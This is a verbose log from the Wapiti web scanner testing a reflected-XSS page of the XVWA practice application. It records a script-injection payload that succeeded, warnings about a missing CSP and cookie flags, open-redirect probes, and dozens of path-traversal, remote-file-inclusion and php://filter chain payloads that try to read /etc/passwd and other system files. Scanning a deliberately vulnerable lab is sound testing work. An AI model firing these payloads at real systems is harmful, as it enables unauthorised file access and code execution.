2024-03-20 15:25:46.919 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:47.023 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:47.024 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:47.136 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-20 15:25:47.136 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_551ba553.db
2024-03-20 15:25:47.139 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
2024-03-20 15:25:47.170 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-20 15:25:47.170 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-20 15:25:47.186 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-20 15:25:47.277 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-20 15:25:47.277 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-20 15:25:47.291 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:47.320 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%3CScRiPt%3Ealert%28%27wzkp6avlec%27%29%3C%2FsCrIpT%3E (0)
2024-03-20 15:25:47.406 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
2024-03-20 15:25:47.407 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/xvwa/vulnerabilities/reflected_xss/ via injection in the parameter item
2024-03-20 15:25:47.407 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
2024-03-20 15:25:47.407 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /xvwa/vulnerabilities/reflected_xss/?item=%3CScRiPt%3Ealert%28%27wzkp6avlec%27%29%3C%2FsCrIpT%3E HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: PHPSESSID=kva5ed7ecdhoiv5tlb45us007n
2024-03-20 15:25:47.408 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
2024-03-20 15:25:47.416 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:47.427 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:47.442 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-20 15:25:47.458 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:47.468 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-20 15:25:47.550 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-20 15:25:47.561 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:47.561 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/reflected_xss/?item=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 15:25:47.576 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/reflected_xss/?item=%2F%2Fopenbugbounty.org%2F
2024-03-20 15:25:47.596 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:47.603 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:47.617 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-20 15:25:47.628 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:47.629 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
2024-03-20 15:25:47.629 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
2024-03-20 15:25:47.671 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
2024-03-20 15:25:47.772 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 15:25:47.785 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:47.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-20 15:25:47.798 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-20 15:25:47.807 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%2Fetc%2Fpasswd (0)
2024-03-20 15:25:47.815 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:47.824 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%2Fetc%2Fservices (0)
2024-03-20 15:25:47.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:47.839 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 15:25:47.847 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-20 15:25:47.856 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-20 15:25:47.865 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:47.876 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:47.886 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-20 15:25:47.898 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-20 15:25:47.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-20 15:25:47.919 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:47.930 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:47.939 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:47.947 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:47.956 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:47.965 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:47.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:47.981 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:47.989 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:47.996 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:48.004 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.019 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-20 15:25:48.028 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:48.037 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:48.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:48.052 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:48.060 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:48.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:48.076 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.084 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.092 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:48.099 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:48.109 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.117 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:48.136 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:48.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:48.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:48.164 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:48.174 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:48.182 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.191 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.198 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:48.206 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:48.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.220 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.228 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-20 15:25:48.235 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 15:25:48.243 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-20 15:25:48.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:48.258 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-20 15:25:48.265 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.274 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
